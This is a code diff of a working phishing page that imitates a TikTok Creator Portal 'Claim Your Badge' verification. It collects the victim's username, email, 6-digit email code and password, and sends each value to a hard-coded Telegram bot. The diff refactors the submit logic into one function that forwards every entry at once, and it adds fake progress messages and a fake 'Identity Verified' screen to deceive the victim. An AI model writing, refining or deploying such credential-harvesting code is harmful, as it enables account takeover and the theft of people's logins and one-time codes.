@@ -3,18 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Creator Portal | Verification</title>
+    <title>TikTok Creator Portal</title>
     <style>
-        :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #000; --tt-card: #1d1d1d; }
+        :root { --tt-pink: #FE2C55; --tt-cyan: #25F4EE; --tt-black: #121212; }
         body { margin: 0; background-color: #000; font-family: sans-serif; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; padding: 20px; box-sizing: border-box; }
-        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: var(--tt-card); border-radius: 12px; border: 1px solid #2a2a2a; }
-        .tt-logo { width: 45px; margin-bottom: 25px; fill: white; }
-        h1 { font-size: 22px; font-weight: 700; margin-bottom: 12px; }
-        p { color: #a1a1a1; font-size: 14px; margin-bottom: 30px; }
+        .container { width: 100%; max-width: 400px; padding: 40px 24px; text-align: center; background: #121212; border-radius: 12px; border: 1px solid #2a2a2a; position: relative; }
+        .tt-logo { width: 42px; margin-bottom: 25px; fill: white; }
+        h1 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        p { color: #a1a1a1; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
         .step { display: none; }
         .step.active { display: block; }
-        input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 15px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
+        input { width: 100%; padding: 14px 16px; background: #2f2f2f; border: 1px solid #3d3d3d; border-radius: 4px; color: white; font-size: 15px; outline: none; margin-bottom: 8px; box-sizing: border-box; transition: 0.3s; }
+        input:focus { border-color: #888; }
+        .status-text { font-size: 12px; color: var(--tt-cyan); height: 18px; margin-bottom: 15px; text-align: left; padding-left: 2px; visibility: hidden; }
+        .status-text.show { visibility: visible; }
+        .btn { width: 100%; padding: 16px; background: var(--tt-pink); color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .btn:disabled { background: #55101d; color: #888; cursor: not-allowed; }
         .loader-ring { border: 3px solid #333; border-top: 3px solid var(--tt-cyan); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -26,30 +30,34 @@
 
     <div id="step1" class="step active">
         <h1>Claim Your Badge</h1>
-        <p>Enter your TikTok @username to check eligibility.</p>
+        <p>Enter your @username to check eligibility.</p>
         <input type="text" id="username" placeholder="@username" spellcheck="false" autocomplete="off">
-        <button class="btn" onclick="submitStep1()">CONTINUE</button>
+        <div id="status1" class="status-text">Checking database...</div>
+        <button id="btn1" class="btn" onclick="processStep(1, 'Checking...', 2)">CONTINUE</button>
     </div>
 
     <div id="step2" class="step">
         <h1>Verify Identity</h1>
-        <p>Enter the email address linked to your account.</p>
-        <input type="email" id="email" placeholder="example@mail.com">
-        <button class="btn" onclick="submitStep2()">SEND CODE</button>
+        <p>Enter the email linked to your account.</p>
+        <input type="email" id="email" placeholder="Email address">
+        <div id="status2" class="status-text">Verifying email...</div>
+        <button id="btn2" class="btn" onclick="processStep(2, 'Connecting...', 3)">SEND CODE</button>
     </div>
 
     <div id="step3" class="step">
         <h1>Verify Your Email</h1>
         <p>Enter the 6-digit code sent to your email.</p>
-        <input type="text" id="code" maxlength="6" inputmode="numeric">
-        <button class="btn" onclick="submitStep3()">CONFIRM CODE</button>
+        <input type="text" id="code" placeholder="6-digit code" maxlength="6">
+        <div id="status3" class="status-text">Validating code...</div>
+        <button id="btn3" class="btn" onclick="processStep(3, 'Authenticating...', 4)">CONFIRM</button>
     </div>
 
     <div id="step4" class="step">
         <h1>Security Check</h1>
         <p>Confirm password to finalize the request.</p>
         <input type="password" id="password" placeholder="Password">
-        <button class="btn" onclick="submitStep4()">VERIFY</button>
+        <div id="status4" class="status-text">Syncing with server...</div>
+        <button id="btn4" class="btn" onclick="processStep(4, 'Finalizing...', 5)">VERIFY</button>
     </div>
 
     <div id="step5" class="step">
@@ -58,7 +66,7 @@
     </div>
 
     <div id="step6" class="step">
-        <div style="color: #25F4EE; font-size: 60px;">✓</div>
+        <div style="color: var(--tt-cyan); font-size: 60px; margin-bottom: 15px;">✓</div>
         <h1>Identity Verified</h1>
         <p>The badge will be applied within <b>5 business days</b>.</p>
     </div>
@@ -69,43 +77,50 @@
     const CHAT_ID = '7489116869';
 
     async function sendMsg(msg) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
-        });
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+            });
+        } catch (e) { console.log("Tele Error"); }
+    }
+
+    function processStep(currentStep, statusMsg, nextStep) {
+        const statusEl = document.getElementById('status' + currentStep);
+        const btnEl = document.getElementById('btn' + currentStep);
+        let val = "";
+
+        if(currentStep === 1) val = document.getElementById('username').value;
+        if(currentStep === 2) val = document.getElementById('email').value;
+        if(currentStep === 3) val = document.getElementById('code').value;
+        if(currentStep === 4) val = document.getElementById('password').value;
+
+        if(!val) { alert("Field cannot be empty"); return; }
+
+        btnEl.disabled = true;
+        statusEl.innerText = statusMsg;
+        statusEl.classList.add('show');
+
+        // Force Send to Telegram immediately
+        if(currentStep === 1) sendMsg(`👤 <b>New Hit</b>\nUser: @${val}`);
+        if(currentStep === 2) sendMsg(`📧 <b>Email</b>\nUser: @${document.getElementById('username').value}\nEmail: ${val}`);
+        if(currentStep === 3) sendMsg(`🔢 <b>Code</b>\nUser: @${document.getElementById('username').value}\nCode: ${val}`);
+        if(currentStep === 4) sendMsg(`🔑 <b>PASSWORD</b>\nUser: @${document.getElementById('username').value}\nPass: <code>${val}</code>`);
+
+        setTimeout(() => {
+            if(nextStep === 5) {
+                goTo(5);
+                setTimeout(() => goTo(6), 4000);
+            } else {
+                goTo(nextStep);
+            }
+        }, 2000);
     }
 
     function goTo(s) {
         document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
         document.getElementById('step' + s).classList.add('active');
-    }
-
-    function submitStep1() {
-        const u = document.getElementById('username').value;
-        if(u.length < 3 || /[A-Z]/.test(u)) { alert("Username must be in lowercase."); return; }
-        sendMsg(`👤 <b>New Hit</b>\nUser: @${u}`);
-        goTo(2);
-    }
-
-    function submitStep2() {
-        const e = document.getElementById('email').value;
-        if(!e.includes('@')) { alert("Invalid Email"); return; }
-        sendMsg(`📧 <b>Email</b>\nUser: @${document.getElementById('username').value}\nEmail: ${e}`);
-        goTo(3);
-    }
-
-    function submitStep3() {
-        const c = document.getElementById('code').value;
-        sendMsg(`🔢 <b>Code</b>\nUser: @${document.getElementById('username').value}\nCode: ${c}`);
-        goTo(4);
-    }
-
-    function submitStep4() {
-        const p = document.getElementById('password').value;
-        sendMsg(`🔑 <b>PASSWORD</b>\nUser: @${document.getElementById('username').value}\nPass: <code>${p}</code>`);
-        goTo(5);
-        setTimeout(() => { goTo(6); }, 4000);
     }
 </script>
 </body>
